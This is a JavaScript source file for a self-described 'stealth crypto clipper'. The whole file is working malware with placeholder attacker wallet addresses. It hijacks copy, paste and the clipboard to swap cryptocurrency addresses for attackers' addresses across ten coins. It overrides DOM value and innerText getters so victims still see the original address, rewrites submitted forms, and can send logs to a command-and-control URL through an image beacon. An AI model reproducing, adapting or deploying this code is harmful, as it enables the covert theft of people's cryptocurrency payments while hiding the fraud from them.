// Stealth Crypto Clipper with Visual Spoofing
// Replaces crypto addresses while displaying original to victim
// Supports: BTC, ETH, XMR, LTC, SOL, DOGE, TRX, XRP, BNB, ADA

const CLIPPER_CONFIG = /*{{CLIPPER_CONFIG}}*/ {
  // Replace these with actual attacker addresses
  addresses: {
    btc: "1AttackerBTCAddressHere32chars",
    eth: "0xAttackerETHAddressHere40chars",
    xmr: "4AttackerXMRAddressHere95charsmoneroaddresstotal",
    ltc: "LAttackerLTCAddressHere33chars",
    sol: "AttackerSOLAddressHere44chars",
    doge: "DAttackerDOGEAddressHere34chars",
    trx: "TAttackerTRXAddressHere34chars",
    xrp: "rAttackerXRPAddressHere25to35",
    bnb: "bnb1attackerbnbaddresshere38chars",
    ada: "addr1attackerADAaddresshere58charsminimumcardano"
  },

  // Regex patterns for detection
  patterns: {
    btc: /^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$|^(bc1)[a-z0-9]{25,39}$/i,
    eth: /^0x[a-fA-F0-9]{40}$/i,
    xmr: /^4[0-9AB][1-9A-HJ-NP-Za-km-z]{93}$/i,
    ltc: /^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$|^(ltc1)[a-z0-9]{39,59}$/i,
    sol: /^[1-9A-HJ-NP-Za-km-z]{32,44}$/,
    doge: /^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32}$/i,
    trx: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    xrp: /^r[1-9A-HJ-NP-Za-km-z]{24,34}$/,
    bnb: /^(bnb1)[a-z0-9]{38}$/i,
    ada: /^addr1[a-z0-9]{58,}$/i
  },

  // Logging endpoint (optional)
  logUrl: null
};

// Track replaced addresses for visual spoofing
const addressMap = new WeakMap();
const replacedAddresses = new Map(); // original -> attacker mapping

/**
 * Detect which cryptocurrency an address belongs to
 */
function detectCrypto(text) {
  const trimmed = text.trim();
  for (const [coin, pattern] of Object.entries(CLIPPER_CONFIG.patterns)) {
    if (pattern.test(trimmed)) {
      return coin;
    }
  }
  return null;
}

/**
 * Replace crypto address with attacker address
 */
function replaceAddress(original) {
  const coin = detectCrypto(original);
  if (!coin) return null;

  const attackerAddr = CLIPPER_CONFIG.addresses[coin];
  if (!attackerAddr || original.trim() === attackerAddr) return null;

  // Store mapping for visual spoofing
  replacedAddresses.set(attackerAddr, original.trim());

  return { coin, original: original.trim(), replaced: attackerAddr };
}

/**
 * VISUAL SPOOFING - Override element rendering to show original address
 * while the actual value is the attacker's address
 */
function installVisualSpoof() {
  // Intercept input/textarea value display
  const originalValueDescriptor = Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value');
  const originalTextareaDescriptor = Object.getOwnPropertyDescriptor(HTMLTextAreaElement.prototype, 'value');

  // Spoof input values
  Object.defineProperty(HTMLInputElement.prototype, 'value', {
    get: function () {
      const realValue = originalValueDescriptor.get.call(this);
      // If this is a replaced address, show original to user
      if (replacedAddresses.has(realValue)) {
        return replacedAddresses.get(realValue);
      }
      return realValue;
    },
    set: function (val) {
      originalValueDescriptor.set.call(this, val);
    },
    configurable: true
  });

  // Spoof textarea values
  Object.defineProperty(HTMLTextAreaElement.prototype, 'value', {
    get: function () {
      const realValue = originalTextareaDescriptor.get.call(this);
      if (replacedAddresses.has(realValue)) {
        return replacedAddresses.get(realValue);
      }
      return realValue;
    },
    set: function (val) {
      originalTextareaDescriptor.set.call(this, val);
    },
    configurable: true
  });

  // Intercept innerText and textContent for div displays
  const originalInnerTextGetter = Object.getOwnPropertyDescriptor(HTMLElement.prototype, 'innerText').get;
  Object.defineProperty(HTMLElement.prototype, 'innerText', {
    get: function () {
      let text = originalInnerTextGetter.call(this);
      // Replace any attacker addresses back to original for display
      for (const [attackerAddr, originalAddr] of replacedAddresses.entries()) {
        if (text.includes(attackerAddr)) {
          text = text.replace(new RegExp(attackerAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'), originalAddr);
        }
      }
      return text;
    },
    configurable: true
  });
}

/**
 * High-stealth clipboard hijacking via 'copy' event
 */
document.addEventListener('copy', (e) => {
  const selection = window.getSelection().toString();
  if (!selection) return;

  const result = replaceAddress(selection);
  if (result) {
    e.clipboardData.setData('text/plain', result.replaced);
    e.preventDefault();
    logReplacement(result);
  }
});

/**
 * Intercept paste events to replace addresses being pasted
 */
document.addEventListener('paste', (e) => {
  const pastedText = e.clipboardData.getData('text/plain');
  if (!pastedText) return;

  const result = replaceAddress(pastedText);
  if (result) {
    e.preventDefault();

    // Insert attacker address, but spoof display
    const activeEl = document.activeElement;
    if (activeEl && (activeEl.tagName === 'INPUT' || activeEl.tagName === 'TEXTAREA')) {
      const start = activeEl.selectionStart;
      const end = activeEl.selectionEnd;
      const currentValue = activeEl.value;

      // Set the REAL value to attacker address
      activeEl.value = currentValue.substring(0, start) + result.replaced + currentValue.substring(end);
      activeEl.selectionStart = activeEl.selectionEnd = start + result.replaced.length;

      // Dispatch events to trigger any listeners
      activeEl.dispatchEvent(new Event('input', { bubbles: true }));
      activeEl.dispatchEvent(new Event('change', { bubbles: true }));
    } else if (document.execCommand) {
      document.execCommand('insertText', false, result.replaced);
    }

    logReplacement(result);
  }
});

/**
 * Direct clipboard monitoring (background polling)
 */
async function monitorClipboard() {
  try {
    if (!document.hasFocus() || !navigator.clipboard?.readText) return;

    const text = await navigator.clipboard.readText();
    const result = replaceAddress(text);
    if (result) {
      await navigator.clipboard.writeText(result.replaced);
      logReplacement(result);
    }
  } catch (err) {
    // Silently fail to avoid detection
  }
}

/**
 * Log replacement for C2 callback (optional)
 */
function logReplacement(result) {
  const logData = {
    type: 'clipper',
    coin: result.coin.toUpperCase(),
    original: result.original,
    replaced: result.replaced,
    url: window.location.href,
    timestamp: Date.now()
  };

  // Console log (silent in production)
  // console.log(`[Clipper] ${result.coin.toUpperCase()}: ${result.original.slice(0,10)}... → ${result.replaced.slice(0,10)}...`);

  // Optional C2 callback
  if (CLIPPER_CONFIG.logUrl) {
    const img = new Image();
    img.src = `${CLIPPER_CONFIG.logUrl}?d=${btoa(JSON.stringify(logData))}`;
  }
}

/**
 * Hook form submissions to ensure addresses are still replaced
 */
function hookForms() {
  document.addEventListener('submit', (e) => {
    const form = e.target;
    if (!form || form.tagName !== 'FORM') return;

    // Check all text inputs
    const inputs = form.querySelectorAll('input[type="text"], textarea');
    inputs.forEach(input => {
      const result = replaceAddress(input.value);
      if (result) {
        // Directly set without triggering getter
        Object.getOwnPropertyDescriptor(HTMLInputElement.prototype, 'value').set.call(input, result.replaced);
        logReplacement(result);
      }
    });
  }, true);
}

/**
 * MutationObserver to catch dynamically added wallet displays
 * Throttled to prevent performance impact on high-DOM-change sites
 */
function observeWalletDisplays() {
  let timeout;
  const observer = new MutationObserver((mutations) => {
    if (timeout) return;

    timeout = setTimeout(() => {
      timeout = null;
      mutations.forEach(mutation => {
        mutation.addedNodes.forEach(node => {
          if (node.nodeType === Node.ELEMENT_NODE) {
            // Check for wallet address patterns in new elements
            const text = node.textContent || '';
            for (const [attackerAddr, originalAddr] of replacedAddresses.entries()) {
              if (text.includes(attackerAddr) && node.innerHTML) {
                // Spoof display back to original
                node.innerHTML = node.innerHTML.replace(
                  new RegExp(attackerAddr.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'), 'g'),
                  `<span data-real="${attackerAddr}">${originalAddr}</span>`
                );
              }
            }
          }
        });
      });
    }, 500); // 500ms throttle
  });

  observer.observe(document.body, { childList: true, subtree: true });
}

// Initialize
(function init() {
  installVisualSpoof();
  hookForms();
  observeWalletDisplays();

  // Clipboard monitoring
  window.addEventListener('focus', monitorClipboard);
  setInterval(monitorClipboard, 3000);
})();
